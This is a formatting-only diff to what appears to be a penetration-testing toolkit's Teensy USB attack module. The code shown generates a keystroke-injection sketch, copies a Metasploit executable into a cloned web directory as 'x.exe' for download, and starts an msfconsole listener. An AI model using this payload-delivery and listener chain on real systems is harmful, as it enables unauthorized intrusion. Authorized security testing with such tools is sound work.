@@ -84,7 +84,7 @@ with open(os.path.join(core.setdir, "teensy")) as fileopen:
 
 def writefile(filename, now):
     with open(os.path.join("src/teensy", filename)) as fileopen, \
-            open(os.path.join(core.setdir, "/reports/teensy_{}.pde".format(now)), "w") as filewrite:
+            open(os.path.join(core.setdir, "/reports/teensy_{0}.pde".format(now)), "w") as filewrite:
 
         for line in fileopen:
             match = re.search("IPADDR", line)
@@ -128,7 +128,9 @@ if choice == "13":
 
 # save our stuff here
 print(core.bcolors.BLUE +
-      "\n[*] PDE file created. You can get it under '{}'".format(os.path.join(core.setdir, "reports", "teensy_{}.pde".format(now))) +
+      "\n[*] PDE file created. You can get it under '{0}'".format(os.path.join(core.setdir,
+                                                                               "reports",
+                                                                               "teensy_{0}.pde".format(now))) +
       core.bcolors.ENDC)
 print(core.bcolors.GREEN +
       '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' +
@@ -144,8 +146,8 @@ if payload_counter == 1:
     metasploit_exec_path = os.path.join(core.setdir, "msf.exe")
     if not apache:
 
-        subprocess.Popen("mkdir {};"
-                         "cp {} {} 1> /dev/null 2> /dev/null".format(webclone_path,
+        subprocess.Popen("mkdir {0};"
+                         "cp {1} {2} 1> /dev/null 2> /dev/null".format(webclone_path,
                                                                      metasploit_exec_path,
                                                                      os.path.join(webclone_path, "x.exe")),
                          shell=True).wait()
@@ -154,14 +156,15 @@ if payload_counter == 1:
             child = pexpect.spawn("python src/html/web_server.py")
 
     else:
-        subprocess.Popen("cp {} {}".format(metasploit_exec_path, os.path.join(webclone_path, "x.exe")), shell=True).wait()
+        subprocess.Popen("cp {0} {1}".format(metasploit_exec_path, os.path.join(webclone_path, "x.exe")), shell=True).wait()
 
     if os.path.isfile(os.path.join(core.setdir, "meta_config")):
         print(core.bcolors.BLUE + "\n[*] Launching MSF Listener...")
         print(core.bcolors.BLUE + "[*] This may take a few to load MSF..." + core.bcolors.ENDC)
         try:
             if operating_system != "windows":
-                child1 = pexpect.spawn("{} -r {}\r\n\r\n".format(os.path.join(msf_path, "msfconsole"), os.path.join(core.setdir, "meta_config")))
+                child1 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(msf_path, "msfconsole"),
+                                                                   os.path.join(core.setdir, "meta_config")))
                 child1.interact()
         except:
             if operating_system != "windows":
